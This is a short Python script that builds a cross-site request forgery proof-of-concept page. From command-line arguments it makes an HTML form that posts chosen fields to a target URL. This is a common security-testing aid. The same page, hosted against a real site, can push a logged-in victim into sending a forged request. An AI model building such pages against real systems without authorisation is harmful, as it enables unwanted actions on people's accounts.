#!/usr/bin/env python3
import sys
import ast

from bs4 import BeautifulSoup, Tag

def generate_poc(method, encoding_type, action, fields):
    """ Generate a CSRF PoC using basic form data """
    content = BeautifulSoup("<html></html>", "html.parser")
    html_tag = content.find("html")
    form_tag = content.new_tag("form", action=action, method=method, enctype=encoding_type)
    html_tag.append(form_tag)

    for field in fields:
        label_tag = content.new_tag('label')
        label_tag.string = field['label']
        field_tag = content.new_tag("input", type=field['type'], value=field['value'])
        field_tag['name'] = field['name']
        form_tag.append(label_tag)
        form_tag.append(field_tag)

    submit_tag = content.new_tag("input", type="submit", value=action)
    form_tag.append(submit_tag)

    return content.prettify()

if __name__ == "__main__":
    method=sys.argv[1]
    encoding_type=sys.argv[2]
    action=sys.argv[3]
    fields = ast.literal_eval(sys.argv[4])
    print(generate_poc(method, encoding_type, action, fields))